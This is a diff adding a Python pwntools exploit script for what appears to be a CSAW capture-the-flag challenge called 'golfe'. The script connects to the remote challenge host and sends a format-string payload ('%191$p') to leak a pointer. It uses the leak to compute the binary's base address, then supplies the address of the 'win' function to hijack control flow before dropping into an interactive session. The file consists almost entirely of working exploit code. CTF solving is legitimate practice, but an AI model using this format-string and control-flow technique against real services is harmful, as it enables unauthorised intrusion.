@@ -1,0 +1,54 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+import signal
+def handle(signum, frame):
+    import os
+    print("killall gdb...")
+    os.system("killall gdb")
+    exit()
+signal.signal(signal.SIGINT, handle)
+exe = ELF("./golfe")
+# context.log_level='debug'
+context.terminal = ["foot"]
+# p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+# gdbs()
+# for i in range(200):
+#     try:
+p = remote("golfing.ctf.csaw.io", 9999)
+sla("ame?",f"%{191}$p")
+p.recvuntil("hello: ")
+addr = int(p.recv(14),16)
+exe.address = addr - 0x3d90
+log.info(f"address: {hex(addr)}")
+log.info(f"exe.address: {hex(exe.address)}")
+sla("im at!: ",hex(exe.sym.win))
+    # except:
+    #     pass
+
+
+
+
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
